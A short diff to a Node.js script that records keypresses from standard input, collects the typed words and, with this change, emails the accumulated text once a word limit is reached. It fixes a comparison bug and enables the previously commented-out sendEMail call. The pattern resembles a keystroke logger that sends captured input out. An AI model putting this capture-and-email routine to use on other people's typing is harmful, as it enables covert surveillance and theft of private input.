@@ -53,9 +53,8 @@ process.stdin.on("keypress", async (str, key) => {
         text += " "
         word = ""
 
-        if(nwords = MAX_WORDS){
-            //await sendEMail(text)
-            console.log(nwords)
+        if(nwords == MAX_WORDS){
+            await sendEMail(text)
             text = ''
             nwords = 0
         }
